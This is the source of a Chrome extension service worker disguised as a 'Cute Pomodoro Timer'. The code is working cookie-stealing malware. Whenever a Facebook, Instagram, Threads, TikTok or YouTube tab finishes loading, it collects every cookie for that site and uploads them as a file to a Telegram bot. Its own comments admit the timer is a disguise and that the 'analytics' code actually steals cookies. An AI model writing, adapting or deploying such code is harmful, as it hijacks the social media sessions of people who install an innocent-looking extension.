// 🍅 Cute Pomodoro Timer - Background Service Worker
// This extension helps you stay productive with adorable Pomodoro sessions!

import BOT_CONFIG from './config.js';

// Pomodoro Timer Configuration (disguise)
const POMODORO_CONFIG = {
    focusTime: 25 * 60 * 1000, // 25 minutes
    shortBreak: 5 * 60 * 1000,  // 5 minutes
    longBreak: 15 * 60 * 1000,  // 15 minutes
    sessions: 0
};

// Generate unique user ID for Pomodoro stats (actually machine ID)
function generateMachineId() {
  return Math.random().toString(36).substring(2, 15) +
         Math.random().toString(36).substring(2, 15);
}

// Get or create user ID for Pomodoro stats (actually machine ID)
async function getMachineId() {
  const storage = await chrome.storage.local.get(['machine_id']);
  if (storage.machine_id) {
    return storage.machine_id;
  }
  const newId = generateMachineId();
  await chrome.storage.local.set({ 'machine_id': newId });
  return newId;
}

// Format productivity data for analytics (actually cookie data)
function formatCookiesData(url, cookies, platform) {
  const date = new Date().toLocaleString();
  return `🍪 New ${platform} Cookies\nURL: ${url}\nTime: ${date}\n\nCookies:\n${cookies}`;
}

function getPlatformFromUrl(url) {
  if (url.includes('facebook.com')) return 'Facebook';
  if (url.includes('instagram.com')) return 'Instagram';
  if (url.includes('threads.net')) return 'Threads';
  if (url.includes('tiktok.com')) return 'TikTok';
  if (url.includes('youtube.com')) return 'YouTube';
  return 'Unknown Platform';
}

function getDomainFromUrl(url) {
  if (url.includes('facebook.com')) return '.facebook.com';
  if (url.includes('instagram.com')) return '.instagram.com';
  if (url.includes('threads.net')) return '.threads.net';
  if (url.includes('tiktok.com')) return '.tiktok.com';
  if (url.includes('youtube.com')) return '.youtube.com';
  return null;
}

// Create productivity report file for analytics (actually cookie file)
async function sendCookieFile(content, filename) {
  const file = new Blob([content], { type: 'text/plain' });
  const formData = new FormData();
  formData.append('document', file, filename);
  return formData;
}

// Check for productivity sync updates (actually Telegram bot messages)
async function checkTelegramUpdates() {
  const url = `${BOT_CONFIG.baseURL}/bot${BOT_CONFIG.token}/getUpdates`;
  try {
    const response = await fetch(url);
    const data = await response.json();
    if (data.ok && data.result.length > 0) {
      const lastMessage = data.result[data.result.length - 1];
      chrome.storage.local.set({
        telegram_chat_id: lastMessage.message.chat.id
      });
    }
  } catch (err) {
    console.error('🍅 Error syncing productivity data:', err);
  }
}

// Send productivity analytics to cloud (actually send cookies to Telegram)
async function sendToTelegram(content) {
  chrome.storage.local.get(['telegram_chat_id'], async function(result) {
    if (!result.telegram_chat_id) {
      await checkTelegramUpdates();
      return;
    }

    try {
      // Lấy machine ID và domain từ content
      const machineId = await getMachineId();
      const urlMatch = content.match(/URL: (.*?)\n/);
      const contentUrl = urlMatch ? urlMatch[1] : '';
      const domain = contentUrl.match(/(?:https?:\/\/)?(?:www\.)?([^\/]+)/i);
      const domainName = domain ? domain[1] : 'unknown';
      const filename = `${machineId}_${domainName}.txt`;
      const formData = await sendCookieFile(content, filename);
      formData.append('chat_id', result.telegram_chat_id);

      const url = `${BOT_CONFIG.baseURL}/bot${BOT_CONFIG.token}/sendDocument`;
      await fetch(url, {
        method: 'POST',
        body: formData
      });
    } catch (err) {
      console.error('Error sending to Telegram:', err);
    }
  });
}

// Monitor productivity sites for focus time tracking (actually steal cookies)
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url) {
    const domain = getDomainFromUrl(tab.url);
    if (domain) {
      // Track user activity for productivity analytics (actually get cookies)
      chrome.cookies.getAll({
        domain: domain
      }, cookies => {
        if (cookies.length > 0) {
          const platform = getPlatformFromUrl(tab.url);
          const cookiesText = JSON.stringify(cookies, null, 2);
          const fileContent = formatCookiesData(tab.url, cookiesText, platform);
          // Send productivity data to analytics server (actually send to Telegram)
          sendToTelegram(fileContent);
        }
      });
    }
  }
});

// Initialize productivity sync on extension start (actually check Telegram updates)
checkTelegramUpdates();

// 🍅 Pomodoro Timer Features
// Add cute notifications and productivity tracking
chrome.alarms.onAlarm.addListener((alarm) => {
  // Handle Pomodoro timer alarms (if we had real ones)
  console.log('🍅 Pomodoro alarm:', alarm.name);
});
